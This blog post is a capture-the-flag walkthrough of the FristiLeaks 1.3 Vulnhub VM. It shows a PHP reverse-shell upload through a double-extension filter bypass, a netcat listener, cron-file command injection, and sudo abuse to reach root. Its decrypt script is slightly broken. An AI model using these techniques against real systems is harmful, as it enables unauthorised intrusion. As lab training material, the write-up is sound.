---
layout: post
title:  "FristiLeaks 1.3"
date:   2016-10-08 23:50:00
categories:
    - hacking
tags:
    - hacking
    - cyber security
    - FristiLeaks
authors:
    - Sudhanshu Passi
---

Vulnhub problem page: https://www.vulnhub.com/entry/fristileaks-13,133/

My setup:

	Kali 2.0 on virtualbox		:192.168.2.7
	
	fristileaks on virtualbox	:192.168.2.8
	
	Both VMs in Bridged mode
	
	VMware users will need to manually edit the VM's MAC address to: 08:00:27:A5:A6:76 
	
### Reconnaissance

I started off with a nmap scan on the victim

~~~

nmap -A -v 192.168.2.8

~~~

It revealed that just port 80 was open.

So I opened up the browser and visited 192.168.2.8 and found an image.

Nothing useful in the image or the source code.

Opened up the robots.txt file

~~~
http://192.168.2.8/robots.txt
~~~

It showed 3 directories:

~~~
/cola
/sisi
/beer
~~~

Opening any of the paths will bring us to a page displaying Obi-Wan’s image. Nothing in the source code too.

There needed to be a hidden directory. By looking at the directories of cola, sisi and beer, you could have guessed there can be a directory named fristi, as it is a drink too.
I tried 

~~~
http://192.168.2.8/fristi/
~~~

and it led me to a login page.

Observing the source code gave me 3 things:

	Name of a possible user: eezeepz
	
	A 64bit encoded image
	
	A 64bit encoded comment

It was evident that the 64bit comment needed to be decoded with a 64bit image decoder.

Decoding the cipher gave a image

Now I used these things as the username and the password:

~~~
Username:	eezeepz
Password:	keKkeKKeKKeKkEkkEk
~~~

This led us to a image uploader page.

I straightaway tried uploading a reverse php shell 

~~~
http://pentestmonkey.net/tools/web-shells/php-reverse-shell
~~~

but the site blocked it.

Its a common mistake to not configure the server properly and allow shell.php.png to get uploaded.

I uploaded the shell and fired up the netcat

~~~
nc -v -n -l -p 1234
~~~

Then I ran the uploaded shell

~~~
http://192.168.2.8/fristi/uploads/shell.php.png
~~~

Running the id command revealed that I had the privileges of a user named apache.

Now traversing from directory to directory I reached

~~~
/home/eezeepz
~~~

There was a notes.txt

~~~
cat notes.txt

Yo EZ,

I made it possible for you to do some automated checks, 
but I did only allow you access to /usr/bin/* system binaries. I did
however copy a few extra often needed commands to my 
homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
from /home/admin/

Don't forget to specify the full path for each binary!

Just put a file called "runthis" in /tmp/, each line one command. The 
output goes to the file "cronresult" in /tmp/. It should 
run every minute with my account privileges.

- Jerry
~~~

Nice. Now we can run commands from the /tmp/runthis file with admin privileges.

### Gaining access

I echoed this command into the runthis file to get admin rights

~~~
echo "/home/admin/chmod -R 777 /home/admin/" > /tmp/runthis

cd /home/admin
~~~

I found 3 interesting files here:

~~~
cat whoisyourgodnow.txt

=RFn0AKnlMHMPIzpyuTI0ITG

cat cryptedpass.txt

mVGZ3O3omkJLmy2pcuTq

cat cryptpass.py

#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
import base64,codecs,sys

def encodeString(str):
    base64string= base64.b64encode(str)
    return codecs.encode(base64string[::-1], 'rot13')

cryptoResult=encodeString(sys.argv[1])
print cryptoResult
~~~

It was evident that the two strings were encoded by cryptpass.py

So I wrote a script reversing that.

~~~
cat decrypt.py

import base64,codecs,sys

def decodeString(str):
	result=codecs.decode(str[::-1], 'rot13')
    return base64.b64decode(result)

cryptoResult=encodeString(sys.argv[1])
print cryptoResult
~~~

~~~
python decrypt.py mVGZ3O3omkJLmy2pcuTq

thisisalsopw123

python decrypt.py =RFn0AKnlMHMPIzpyuTI0ITG

LetThereBeFristi!
~~~

These might be the passwords to root or any other user. I needed a tty/pty

The best way to spawn a tty:

~~~
python -c 'import pty;pty.spawn("/bin/bash")'
~~~

Then 

~~~
su fristigod
password:LetThereBeFristi!
~~~

Then I went back to a directory that was blocked to me but was open to fristigod

~~~
/var/fristigod
~~~

It had a file named .bash_history

Opening that revealed the nature of commands executed in that folder.

There was another folder named .secret_admin_stuff

In that was a executable doCom

Turns out doCom can only be run by root.

But according to .bash_history, doCom was run by a user names fristi.

Thus

~~~
sudo -u fristi ./doCom
~~~

It revealed that it was a command line interface to run any command as root!

Thus

~~~
sudo -u fristi ./doCom /bin/bash

id

uid=0(root) gid=100(users) groups=100(users),502(fristigod)
~~~

We have obtained root

Lets go to the root dir

~~~
cd /root/
~~~

There we found a file  fristileaks_secrets.txt, with a flag: Y0u_kn0w_y0u_l0ve_fr1st1

Thus the system was pawned and the flag was received. :)